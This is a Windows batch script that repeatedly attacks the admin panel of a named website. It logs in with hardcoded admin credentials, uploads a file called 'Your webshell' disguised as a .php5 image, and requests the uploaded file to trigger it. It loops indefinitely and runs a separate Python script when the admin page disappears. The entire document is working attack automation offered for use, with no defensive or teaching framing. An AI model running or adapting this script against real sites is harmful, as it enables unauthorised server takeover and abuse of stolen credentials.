@echo off
setlocal enabledelayedexpansion

set FILE=Your webshell
set ADMIN=http://www.bancocn.com/admin/login.php
set LOGIN=http://www.bancocn.com/admin/index.php
set UPLOAD=http://www.bancocn.com/admin/index.php
set AUTOPWN=http://www.bancocn.com/admin/uploads/lolol.php5
set COOKIE=cookies.txt

:check_online
for /L %%i in (1,1,5) do (
    rem pega http_code
    for /f "tokens=*" %%s in ('curl -s -o tmp_response.txt -w "%%{http_code}" %ADMIN%') do (
        set CODE=%%s
    )

    if "!CODE!"=="200" (
        findstr /i "Not Found" tmp_response.txt >nul
        if !errorlevel! == 0 (
            echo [%%i] Admin deleted!
        ) else (
            echo [%%i] 200 OK - site online, trying to exploit...

            rem Login
            curl -s -c %COOKIE% -d "user=admin&password=senhafoda" %LOGIN% >nul

            rem Upload 
            curl -s -b %COOKIE% -F "image=@%FILE%" -F "title=lolol.php5" -F "category=1" -F "Add=Add" %UPLOAD% >nul

            rem Exploit
            for /f "tokens=*" %%u in ('curl -s -o tmp_up.txt -w "%%{http_code}" %AUTOPWN%') do set UPCODE=%%u
            if "!UPCODE!"=="200" (
            ) else (
                echo Upload falied
            )
        )
    ) else if "!CODE!"=="521" (
        echo [%%i] 521 - Server restarting...
    ) else if "!CODE!"=="404" (
        echo [%%i] 404 - Admin Deleted!
        python post.py
    ) else (
        echo [%%i] Status !CODE! - other error
    )
)
goto check_online
